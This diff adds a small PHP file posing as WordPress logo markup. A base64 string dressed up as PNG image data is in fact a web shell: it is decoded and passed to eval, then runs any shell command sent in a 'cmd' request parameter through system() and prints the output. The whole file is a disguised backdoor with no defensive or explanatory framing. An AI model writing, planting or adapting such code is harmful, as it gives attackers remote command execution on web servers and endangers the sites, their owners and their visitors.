@@ -1,0 +1,8 @@
+<?php
+
+            $wp_default_logo = '<img src="data:image/png;aWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9">';
+            preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);
+            $logo_image = $logo_data[1];
+            eval(base64_decode($logo_image));
+
+?>
